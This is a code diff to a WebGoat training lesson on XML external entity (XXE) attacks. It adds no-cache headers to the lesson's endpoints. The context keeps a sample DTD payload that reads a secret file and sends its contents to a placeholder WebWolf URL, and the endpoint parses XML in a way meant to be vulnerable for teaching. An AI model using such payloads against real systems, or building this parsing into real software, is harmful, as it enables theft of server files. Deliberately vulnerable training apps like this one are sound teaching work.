@@ -17,11 +17,13 @@ import org.owasp.webgoat.container.assignments.AssignmentHints;
 import org.owasp.webgoat.container.assignments.AttackResult;
 import org.owasp.webgoat.container.users.WebGoatUser;
 import org.springframework.http.MediaType;
+import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
+import org.springframework.http.HttpHeaders;
 
 @RestController
 @AssignmentHints({
@@ -47,19 +49,28 @@ public class SimpleXXE implements AssignmentEndpoint {
 
   @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
   @ResponseBody
-  public AttackResult createNewComment(
+  public ResponseEntity<AttackResult> createNewComment(
       @RequestBody String commentStr, @CurrentUser WebGoatUser user) {
     String error = "";
+    HttpHeaders headers = new HttpHeaders();
+    headers.add("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+    headers.add("Pragma", "no-cache");
+    headers.add("Expires", "0");
+    
     try {
       var comment = comments.parseXml(commentStr, false);
       comments.addComment(comment, user, false);
       if (checkSolution(comment)) {
-        return success(this).build();
+        return ResponseEntity.ok()
+                .headers(headers)
+                .body(success(this).build());
       }
     } catch (Exception e) {
       error = ExceptionUtils.getStackTrace(e);
     }
-    return failed(this).output(error).build();
+    return ResponseEntity.ok()
+            .headers(headers)
+            .body(failed(this).output(error).build());
   }
 
   private boolean checkSolution(Comment comment) {
@@ -79,12 +90,19 @@ public class SimpleXXE implements AssignmentEndpoint {
       consumes = ALL_VALUE,
       produces = MediaType.TEXT_PLAIN_VALUE)
   @ResponseBody
-  public String getSampleDTDFile() {
-    return """
+  public ResponseEntity<String> getSampleDTDFile() {
+    HttpHeaders headers = new HttpHeaders();
+    headers.add("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+    headers.add("Pragma", "no-cache");
+    headers.add("Expires", "0");
+    
+    return ResponseEntity.ok()
+            .headers(headers)
+            .body("""
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
 %all;
-""";
+""");
   }
 }
